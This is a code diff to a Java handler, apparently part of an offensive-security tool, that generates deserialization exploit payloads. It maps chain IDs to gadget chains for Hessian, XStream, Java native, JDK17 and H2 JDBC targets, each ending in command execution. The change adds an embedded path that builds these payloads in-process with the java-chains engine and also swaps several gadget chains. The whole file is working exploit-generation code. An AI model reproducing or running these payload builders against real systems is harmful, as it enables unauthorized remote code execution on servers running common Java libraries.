@@ -1,5 +1,8 @@
 package com.oobx.chains;
 
+import com.ar3h.chains.common.BuildResult;
+import com.ar3h.chains.common.Payload;
+import com.ar3h.chains.core.ExecutionEngine;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Component;
 
@@ -18,7 +21,9 @@ import java.util.Optional;
 import java.util.logging.Logger;
 
 /**
- * Proxies payload generation to a running java-chains instance.
+ * Generates java-chains payloads. The preferred path is the embedded
+ * chains-core engine vendored under libs/chains-jars; the HTTP java-chains
+ * service path remains as a compatibility fallback.
  *
  * java-chains (https://github.com/ar3h/java-chains) is a Spring Boot
  * service exposing a rich gadget library via a single REST endpoint:
@@ -38,6 +43,39 @@ import java.util.logging.Logger;
 public class JavaChainsProxyHandler implements ChainHandler {
 
     private static final Logger log = Logger.getLogger(JavaChainsProxyHandler.class.getName());
+    private static final List<String> PAYLOAD_PACKAGES = List.of(
+        "com.ar3h.chains.core.payload.impl.",
+        "com.ar3h.chains.core.payload.impl.jndi.",
+        "com.ar3h.chains.core.payload.impl.amf."
+    );
+    private static final List<String> GADGET_PACKAGES = List.of(
+        "com.ar3h.chains.gadget.impl.hessian.",
+        "com.ar3h.chains.gadget.impl.hessian.jdk.",
+        "com.ar3h.chains.gadget.impl.hessian.ext.",
+        "com.ar3h.chains.gadget.impl.hessian.other.",
+        "com.ar3h.chains.gadget.impl.hessian.spring.",
+        "com.ar3h.chains.gadget.impl.hessian.spring.ext.",
+        "com.ar3h.chains.gadget.impl.amf.",
+        "com.ar3h.chains.gadget.impl.fastjson.",
+        "com.ar3h.chains.gadget.impl.bytecode.common.",
+        "com.ar3h.chains.gadget.impl.bytecode.convert.",
+        "com.ar3h.chains.gadget.impl.jndi.",
+        "com.ar3h.chains.gadget.impl.jndi.factory.beanfactory.expression.",
+        "com.ar3h.chains.gadget.impl.common.expression.",
+        "com.ar3h.chains.gadget.impl.common.jdbc.h2.",
+        "com.ar3h.chains.gadget.impl.common.other.",
+        "com.ar3h.chains.gadget.impl.common.tostring.",
+        "com.ar3h.chains.gadget.impl.javanative.",
+        "com.ar3h.chains.gadget.impl.javanative.jdk.",
+        "com.ar3h.chains.gadget.impl.javanative.mchange_c3p0.",
+        "com.ar3h.chains.gadget.impl.javanative.jackson.",
+        "com.ar3h.chains.gadget.impl.javanative.spring.",
+        "com.ar3h.chains.gadget.impl.javanative.commons.jdk.",
+        "com.ar3h.chains.gadget.impl.javanative.commons.beanutils.",
+        "com.ar3h.chains.gadget.impl.javanative.commons.collections.",
+        "com.ar3h.chains.gadget.impl.javanative.commons.collection_v3.",
+        "com.ar3h.chains.gadget.impl.javanative.commons.collection_v4."
+    );
 
     @Value("${javachains.url:http://127.0.0.1:8011}")
     private String baseUrl;
@@ -75,13 +113,14 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Spring JNDI1 (PartiallyComparableAdvisorHolder)
         m.put("jchains_hessian1_spring",
             new ChainDef("HessianPayload",
-                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                 true, "application/octet-stream"));
 
         // exec: JDK native XSLT (no Spring deps on target)
         m.put("jchains_hessian1_exec",
             new ChainDef("HessianPayload",
-                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // Spring JNDI2 (AbstractBeanFactoryPointcutAdvisor)
@@ -99,9 +138,8 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Secondary deserialization via SwingLazyValue + Spring CB1
         m.put("jchains_hessian1_secondary",
             new ChainDef("HessianPayload",
-                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
-                        "JavaNativeSerialization", "CommonsBeanutils1",
-                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // JDK native BCEL (ProxyLazyValue)
@@ -121,7 +159,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Rome2 secondary deserialization
         m.put("jchains_hessian1_rome2",
             new ChainDef("HessianPayload",
-                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
+                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
                         "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
@@ -130,13 +168,14 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Spring JNDI1
         m.put("jchains_hessian2_spring",
             new ChainDef("Hessian2Payload",
-                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                 true, "application/octet-stream"));
 
         // exec: JDK native XSLT
         m.put("jchains_hessian2_exec",
             new ChainDef("Hessian2Payload",
-                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // Spring JNDI2
@@ -154,9 +193,8 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Secondary deserialization
         m.put("jchains_hessian2_secondary",
             new ChainDef("Hessian2Payload",
-                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
-                        "JavaNativeSerialization", "CommonsBeanutils1",
-                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // BCEL
@@ -176,7 +214,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Rome2 secondary
         m.put("jchains_hessian2_rome2",
             new ChainDef("Hessian2Payload",
-                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
+                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
                         "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
@@ -191,8 +229,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Jackson toString secondary deserialization
         m.put("jchains_hessian2_tostring_jackson",
             new ChainDef("Hessian2ToStringPayload",
-                List.of("JacksonToString", "SignedObject", "JavaNativeSerialization",
-                        "Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                List.of("XBeanToString", "TomcatElRef", "ElConvert", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // ── Fastjson ──────────────────────────────────────────────────────────
@@ -224,17 +261,18 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // Spring JNDI
         m.put("jchains_xstream",
             new ChainDef("XStreamPayload",
-                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                 true, "application/xml"));
         m.put("jchains_xstream_jndi",
             new ChainDef("XStreamPayload",
-                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                 true, "application/xml"));
 
         // JDK native exec
         m.put("jchains_xstream_exec",
             new ChainDef("XStreamPayload",
-                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
                 false, "application/xml"));
 
         // ── Shiro ─────────────────────────────────────────────────────────────
@@ -302,7 +340,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
 
         m.put("jchains_native_jackson",
             new ChainDef("JavaNativePayload",
-                List.of("Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // ── JavaNative: JDK17 high-version chains ─────────────────────────────
@@ -310,15 +348,13 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // JDK17 RCE chain 1 (EventListenerList)
         m.put("jchains_native_jdk17_1",
             new ChainDef("JavaNativePayload",
-                List.of("EventListenerListToStringHighJDK", "JacksonToString",
-                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
+                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // JDK17 RCE chain 2 (TextAndMnemonicHashMap)
         m.put("jchains_native_jdk17_2",
             new ChainDef("JavaNativePayload",
-                List.of("TextAndMnemonicHashMapToStringHighJDK", "JacksonToString",
-                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
+                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                 false, "application/octet-stream"));
 
         // ── JavaNative: C3P0 ──────────────────────────────────────────────────
@@ -375,7 +411,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
         // ── H2 JDBC RCE (text/plain JDBC URL with embedded bytecode) ─────────
 
         m.put("jchains_h2_jdbc",
-            new ChainDef("OtherPayload",
+            new ChainDef("JDBCPayload",
                 List.of("H2JavaJdbc1", "BytecodeConvert", "Exec"),
                 false, "text/plain"));
 
@@ -394,6 +430,9 @@ public class JavaChainsProxyHandler implements ChainHandler {
     public java.util.Set<String> chainIds() { return CHAIN_MAP.keySet(); }
 
     public boolean isAvailable() {
+        if (ensureEmbeddedAvailable()) {
+            return true;
+        }
         try {
             HttpRequest req = HttpRequest.newBuilder()
                 .uri(URI.create(baseUrl + "/version"))
@@ -415,6 +454,7 @@ public class JavaChainsProxyHandler implements ChainHandler {
 
     private volatile String sessionCookie = null;
     private final Object loginLock = new Object();
+    private volatile Boolean embeddedAvailable = null;
 
     // ── ChainHandler ──────────────────────────────────────────────────────────
 
@@ -455,20 +495,125 @@ public class JavaChainsProxyHandler implements ChainHandler {
             jcParams = Map.of("cmd", cmd, "needAbstractTranslet", "true");
         }
 
-        byte[] bytes = callParse(def, jcParams);
+        boolean embedded = ensureEmbeddedAvailable();
+        byte[] bytes = embedded ? buildEmbedded(def, jcParams) : callParse(def, jcParams);
 
         if (bytes.length == 0) {
             return new PayloadResult("application/octet-stream", new byte[0],
                 Map.of("error", "java-chains returned empty payload",
                        "chain", chainId, "payloadName", def.payloadName(),
-                       "hint", "Ensure java-chains is running at " + baseUrl
-                             + " with CHAINS_AUTH=false"));
+                       "hint", "Embedded java-chains failed; if using external mode, ensure java-chains is running at "
+                             + baseUrl + " with CHAINS_AUTH=false"));
         }
 
         return new PayloadResult(def.outContentType(), bytes,
             Map.of("chain", chainId, "payloadName", def.payloadName(),
                    "gadgets", def.gadgets(), "size", bytes.length,
-                   "source", "java-chains@" + baseUrl));
+                   "source", embedded ? "embedded-java-chains" : "java-chains@" + baseUrl));
+    }
+
+    private boolean ensureEmbeddedAvailable() {
+        Boolean cached = embeddedAvailable;
+        if (cached != null) {
+            return cached;
+        }
+        synchronized (this) {
+            if (embeddedAvailable != null) {
+                return embeddedAvailable;
+            }
+            try {
+                Class<?> payloadClass = resolvePayloadClass("JavaNativePayload");
+                Class<?> execClass = resolveGadgetClass("Exec");
+                embeddedAvailable = payloadClass != null && execClass != null;
+                if (embeddedAvailable) {
+                    log.info("embedded java-chains engine ready");
+                } else {
+                    log.warning("embedded java-chains engine missing payload or gadget registry: "
+                        + "JavaNativePayload=" + (payloadClass != null)
+                        + ", Exec=" + (execClass != null));
+                }
+                return embeddedAvailable;
+            } catch (Throwable e) {
+                embeddedAvailable = false;
+                log.warning("embedded java-chains unavailable: " + e.getMessage());
+                return false;
+            }
+        }
+    }
+
+    @SuppressWarnings({"rawtypes", "unchecked"})
+    private byte[] buildEmbedded(ChainDef def, Map<String, String> jcParams) throws Exception {
+        Class<?> payloadClass = resolvePayloadClass(def.payloadName());
+        if (payloadClass == null) {
+            log.warning("embedded java-chains: unknown payload " + def.payloadName());
+            return new byte[0];
+        }
+
+        Payload payload = (Payload) payloadClass.getDeclaredConstructor().newInstance();
+        ExecutionEngine engine = ExecutionEngine.create(payload);
+        for (String gadget : def.gadgets()) {
+            Class<?> gadgetClass = resolveGadgetClass(gadget);
+            if (gadgetClass == null) {
+                log.warning("embedded java-chains: unknown gadget " + gadget);
+                return new byte[0];
+            }
+            engine.add((Class) gadgetClass);
+        }
+        Map<String, Object> engineParams = new HashMap<>();
+        engineParams.putAll(jcParams);
+        engine.setAll(engineParams);
+
+        BuildResult<?> result = engine.build();
+        if (!result.isSuccess()) {
+            log.warning("embedded java-chains build failed: " + result.getMessage());
+            return new byte[0];
+        }
+
+        Object data = result.getData();
+        if (data instanceof byte[] bytes) {
+            return bytes;
+        }
+        if (data instanceof String text) {
+            return text.getBytes(StandardCharsets.UTF_8);
+        }
+        return data == null ? new byte[0] : data.toString().getBytes(StandardCharsets.UTF_8);
+    }
+
+    private Class<?> resolvePayloadClass(String simpleName) {
+        return resolveClass(simpleName, PAYLOAD_PACKAGES);
+    }
+
+    private Class<?> resolveGadgetClass(String simpleName) {
+        return resolveClass(simpleName, GADGET_PACKAGES);
+    }
+
+    private Class<?> resolveClass(String simpleName, List<String> packages) {
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        if (classLoader == null) {
+            classLoader = JavaChainsProxyHandler.class.getClassLoader();
+        }
+
+        if (simpleName.contains(".")) {
+            return loadClass(simpleName, classLoader);
+        }
+        for (String pkg : packages) {
+            Class<?> clazz = loadClass(pkg + simpleName, classLoader);
+            if (clazz != null) {
+                return clazz;
+            }
+        }
+        return null;
+    }
+
+    private Class<?> loadClass(String className, ClassLoader classLoader) {
+        try {
+            return Class.forName(className, false, classLoader);
+        } catch (ClassNotFoundException ignored) {
+            return null;
+        } catch (LinkageError e) {
+            log.warning("embedded java-chains class load failed for " + className + ": " + e);
+            return null;
+        }
     }
 
     // ── /parse API call ───────────────────────────────────────────────────────
